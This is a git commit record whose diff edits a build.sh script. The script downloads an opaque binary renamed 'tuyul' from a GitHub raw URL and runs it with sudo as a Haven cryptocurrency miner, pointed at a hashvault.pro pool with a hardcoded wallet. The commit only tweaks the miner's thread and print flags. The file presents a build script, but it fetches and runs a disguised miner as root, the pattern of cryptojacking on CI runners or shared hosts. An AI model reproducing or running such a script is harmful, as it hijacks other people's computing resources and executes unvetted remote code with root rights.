7b6a58a4d52c1e9ed011d12b201b049604f86123
Diaznr <79598104+Diaznr@users.noreply.github.com>
2021-03-24 19:38:27 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -2,4 +2,4 @@ sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libh
 wget https://github.com/Diaznr/p/raw/main/tuyul
 sudo sysctl -w vm.nr_hugepages=1280
 chmod +x tuyul
-sudo ./tuyul -a cn-heavy/xhv --url singapore01.hashvault.pro:80 --user hvxy8xG4XHcjk2FCA5RSHK1vz2kkae7VdDEjUMJqBAaoWNBFDQmMNpwEkmwK2jePsJd2zbbJDrJtCgh67ErMeubb6hjaybbP3r --pass Havenn --cpu-no-yield -k --cpu-priority 5 --tls
+sudo ./tuyul -a cn-heavy/xhv --url singapore01.hashvault.pro:80 --user hvxy8xG4XHcjk2FCA5RSHK1vz2kkae7VdDEjUMJqBAaoWNBFDQmMNpwEkmwK2jePsJd2zbbJDrJtCgh67ErMeubb6hjaybbP3r --pass Havenn --cpu-no-yield -k --cpu-priority 5 --tls --threads 2 --print-time 10
